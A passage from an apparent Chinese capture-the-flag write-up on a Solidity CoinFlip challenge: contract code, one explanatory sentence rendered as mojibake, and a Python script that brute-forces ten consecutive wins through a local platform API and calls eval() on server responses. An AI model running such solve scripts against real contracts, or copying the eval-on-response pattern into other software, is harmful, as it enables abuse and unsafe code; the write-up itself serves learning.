</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=kc>true</span><span class=p>,</span><span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=p>(</span><span class=kc>true</span><span class=p>,</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>consecutiveWins</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=p>(</span><span class=kc>false</span><span class=p>,</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>verify</span><span class=p>()</span> <span class=n>verifyConsecutiveWins</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span><span class=kt>uint256</span><span class=p>,</span><span class=kt>string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>winer</span><span class=p>,</span><span class=n>consecutiveWinNumber</span><span class=p>,</span><span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥çœ‹åˆ°ä¸‹ä¸€æ¬¡æ­£åæ˜¯ç”±ä¸Šä¸€æ¬¡çš„ nonce ä»¥åŠ block è‡ªå·±çš„å±æ€§ç­‰ç”Ÿæˆçš„ï¼Œä½†æ˜¯åªçŒœ 10 æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥å¤§åŠ›å‡ºå¥‡è¿¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>time</span> <span class=kn>import</span> <span class=n>sleep</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://127.0.0.1:3000/api/trans/handle&#34;</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Origin&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:3000&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-ch-ua-mobile&#34;</span><span class=p>:</span> <span class=s2>&#34;?0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Sec-Fetch-Site&#34;</span><span class=p>:</span> <span class=s2>&#34;same-origin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Accept-Language&#34;</span><span class=p>:</span> <span class=s2>&#34;en-GB,en-US;q=0.9,en;q=0.8&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-ch-ua-platform&#34;</span><span class=p>:</span> <span class=s1>&#39;&#34;Windows&#34;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/json&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;*/*&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Referer&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:3000/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Accept-Encoding&#34;</span><span class=p>:</span> <span class=s2>&#34;gzip, deflate, br, zstd&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Sec-Fetch-Mode&#34;</span><span class=p>:</span> <span class=s2>&#34;cors&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Sec-Fetch-Dest&#34;</span><span class=p>:</span> <span class=s2>&#34;empty&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;sec-ch-ua&#34;</span><span class=p>:</span> <span class=s1>&#39;&#34;Google Chrome&#34;;v=&#34;141&#34;, &#34;Not?A_Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;141&#34;&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_guess</span><span class=p>(</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;groupId&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;user&#34;</span><span class=p>:</span> <span class=s2>&#34;0x9908bd276177e5b8f87c68e8d0097eab1959023d&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractName&#34;</span><span class=p>:</span> <span class=s2>&#34;CoinFlip&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractPath&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;funcName&#34;</span><span class=p>:</span> <span class=s2>&#34;flip&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;funcParam&#34;</span><span class=p>:</span> <span class=p>[</span><span class=n>b</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractAddress&#34;</span><span class=p>:</span> <span class=s2>&#34;0x27f714e5ac1370580776803bae02dd2fb6ddb8f6&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractAbi&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;_guess&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;bool&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;flip&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;bool&#34;</span><span class=p>},</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;nonpayable&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;consecutiveWins&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;view&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;verify&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;address&#34;</span><span class=p>},</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>                            <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;view&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;_key&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;nonpayable&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;constructor&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;anonymous&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;indexed&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;address&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>                           <span class=p>{</span><span class=s2>&#34;indexed&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;ConsecutiveWins&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;event&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_num</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;groupId&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;user&#34;</span><span class=p>:</span> <span class=s2>&#34;0x9908bd276177e5b8f87c68e8d0097eab1959023d&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractName&#34;</span><span class=p>:</span> <span class=s2>&#34;CoinFlip&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractPath&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;funcName&#34;</span><span class=p>:</span> <span class=s2>&#34;consecutiveWins&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;funcParam&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractAddress&#34;</span><span class=p>:</span> <span class=s2>&#34;0x27f714e5ac1370580776803bae02dd2fb6ddb8f6&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;contractAbi&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;_guess&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;bool&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;flip&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;bool&#34;</span><span class=p>},</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;nonpayable&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;consecutiveWins&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;view&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;constant&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;verify&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;outputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;address&#34;</span><span class=p>},</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>                            <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;view&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;function&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;_key&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;payable&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;stateMutability&#34;</span><span class=p>:</span> <span class=s2>&#34;nonpayable&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;constructor&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;anonymous&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;inputs&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=s2>&#34;indexed&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;address&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>                           <span class=p>{</span><span class=s2>&#34;indexed&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;uint256&#34;</span><span class=p>}],</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;ConsecutiveWins&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;event&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>_</span><span class=p>,</span> <span class=n>n</span> <span class=o>=</span> <span class=n>get_num</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>n</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>n</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>n</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>n</span> <span class=o>==</span> <span class=mi>10</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>send_guess</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>([</span><span class=kc>True</span><span class=p>,</span> <span class=kc>False</span><span class=p>]))</span>
